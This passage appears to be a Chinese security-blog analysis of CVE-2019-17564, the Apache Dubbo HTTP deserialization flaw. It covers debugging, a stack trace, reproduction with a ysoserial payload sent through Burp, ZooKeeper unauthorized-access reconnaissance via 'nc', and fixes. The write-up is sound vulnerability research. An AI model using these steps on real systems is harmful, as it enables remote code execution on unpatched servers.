接着利用burp发送paylaod，来到断点处。
然后按F7开始调试。首先来到`org.apache.dubbo.rpc.protocol.http.HttpProtocol.InternalHandler#handle`方法内。
169：获取请求路径
170：实例化HttpInvokerServiceExporter方法，并传递请求路径。
174：设置请求的地址和端口，并初始化。
接着，来到`org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter#handleRequest`方法内。
29 ：读远程调用
`org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter#readRemoteInvocation(javax.servlet.http.HttpServletRequest,
java.io.InputStream)`
最终，来到`org.springframework.remoting.rmi.RemoteInvocationSerializingExporter#doReadRemoteInvocation`方法内  
68：反序列化读取对象，没有进行安全验证，从而触发反序列化漏洞执行任意代码。
堆栈
    doReadRemoteInvocation:144, RemoteInvocationSerializingExporter (org.springframework.remoting.rmi)
    readRemoteInvocation:121, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)
    readRemoteInvocation:100, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)
    handleRequest:79, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)
    handle:216, HttpProtocol$InternalHandler (org.apache.dubbo.rpc.protocol.http)
    service:61, DispatcherServlet (org.apache.dubbo.remoting.http.servlet)
    service:790, HttpServlet (javax.servlet.http)
    internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
    invoke:198, StandardWrapperValve (org.apache.catalina.core)
    invoke:96, StandardContextValve (org.apache.catalina.core)
    invoke:496, AuthenticatorBase (org.apache.catalina.authenticator)
    invoke:140, StandardHostValve (org.apache.catalina.core)
    invoke:81, ErrorReportValve (org.apache.catalina.valves)
    invoke:87, StandardEngineValve (org.apache.catalina.core)
    service:342, CoyoteAdapter (org.apache.catalina.connector)
    service:803, Http11Processor (org.apache.coyote.http11)
    process:66, AbstractProcessorLight (org.apache.coyote)
    process:790, AbstractProtocol$ConnectionHandler (org.apache.coyote)
    doRun:1468, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
    run:49, SocketProcessorBase (org.apache.tomcat.util.net)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
    run:748, Thread (java.lang)
## 漏洞复现
###  payload生成
ysoserial.jar工具直接下载GitHub地址 
`java -jar ysoserial.jar CommonsCollections4 calc > calc.ser`
###  发包
浏览器访问HTTP协议接口路径（参考`target/classes/spring/http-provider.xml`文件中的配置）
`http://192.168.186.1:8080/org.apache.dubbo.samples.http.api.DemoService`，抓取请求包。
发送到burp的重放模块，请求方式改为`POST`，数据体用`Paste from file`选项选择刚才的paylaod文件`calc.ser`  
点击`Go`即可出发漏洞执行`calc`命令
## 识别及利用
虽然这个漏洞复现起来挺简单的，但是，在实际渗透测试中使用却存在两个难点：
  1. 不能确定目标Dubbo是否使用http协议。
  2. 无法确定接口路径。
那么问题来了，黑盒情况下如何获取这些信息？
我首先想到拿我本地复现时的默认接口路径去尝试，经过一番fofa、shodan尝试，随即否定了。
我们回过头来分析一下，接口信息是写在`http-provider.xml`配置中的，如下，配置的最后一行：
同时，Dubbo又跟zookeeper有交互。
虽然我们不能直接查看`http-provider.xml`配置文件，但是zookeeper默认情况下，存在未授权访问漏洞。正好可以利用这个漏洞来查看接口路径，同时也解决了Dubbo所使用的协议的问题。
    kali@kali:~$ echo dump | nc  192.168.186.1 2181
    SessionTracker dump:
    Session Sets (3):
    0 expire at Sun Sep 06 15:32:44 CST 2020:
    0 expire at Sun Sep 06 15:32:56 CST 2020:
    1 expire at Sun Sep 06 15:33:10 CST 2020:
            0x1745a82ab030007
    ephemeral nodes dump:
    Sessions with Ephemerals (1):
    0x1745a82ab030007:
            /dubbo/org.apache.dubbo.samples.http.api.DemoService/providers/http%3A%2F%2F192.168.186.1%3A8080%2Forg.apache.dubbo.samples.http.api.DemoService%3Fanyhost%3Dfalse%26application%3Dhttp-provider%26bean.name%3Dorg.apache.dubbo.samples.http.api.DemoService%26deprecated%3Dfalse%26dubbo%3D2.0.2%26dynamic%3Dtrue%26generic%3Dfalse%26interface%3Dorg.apache.dubbo.samples.http.api.DemoService%26methods%3DsayHello%26pid%3D4988%26register%3Dtrue%26release%3D2.7.3%26server%3Dtomcat%26side%3Dprovider%26timestamp%3D1599374218648
当然，还有其他情况，期待大佬补充。
## 修复及防御方案
###  修复
第一种、 最简单的，就是升级到不受影响版本，具体升级步骤参考官方文档。
第二种、 禁用http协议，使用其他Dubbo支持协议。
修改`http-provider.xml`配置文件：
具体详情参考官方协议配置文档。
###  防御方案
下面分析一下漏洞利用过程中的数据交互，以期找到其特征，从而有针对性的识别攻击。
在虚拟机中，用python写了个脚本，来利用此漏洞。
通过Wireshark抓包，如下：
不过，现在市面上的大多数WAF都添加了此漏洞的特征。
## 参考
  * [【CVE-2019-17564】 Apache Dubbo反序列化漏洞-Pony Mail](https://lists.apache.org/thread.html/r13f7a58fa5d61d729e538a378687118e00c3e229903ba1e7b3a807a2%40%3Cdev.dubbo.apache.org%3E)
  * [Apache Dubbo官网](https://dubbo.apache.org/zh-cn/index.html)
  * [Apache Dubbo反序列化漏洞（CVE-2019-17564） – 冬泳怪鸽 – 博客园](https://www.cnblogs.com/zaqzzz/p/12443794.html)
  * [Zookeeper未授权访问测试](https://www.cnblogs.com/Hi-blog/p/Zookeeper-UnAuthorization-Access.html)